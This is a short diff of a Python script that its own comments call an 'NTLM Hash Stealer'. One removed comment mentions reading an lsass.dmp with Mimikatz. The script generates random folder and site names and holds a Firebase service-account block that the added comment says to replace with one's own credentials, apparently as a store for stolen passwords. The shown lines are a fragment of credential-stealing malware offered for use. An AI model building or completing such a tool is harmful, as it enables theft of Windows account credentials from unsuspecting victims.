@@ -8,8 +8,6 @@ from requests import get
 from colorama import Fore,Back as bg
 
 
-#NTLM Hash Stealer - Incomplete
-#Lacks implementation of Mimikatz to read the lsass.dmp
 
 def password_gen(length):
     characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
@@ -25,6 +23,7 @@ __folder__ = password_gen(10)
 __site__ = password_gen(10)
 __out__ = password_gen(10)
 
+# Change this to your firebase credentials 
 creds_content = {
   "type": "service_account",
   "project_id": "password-database-1a0d7",
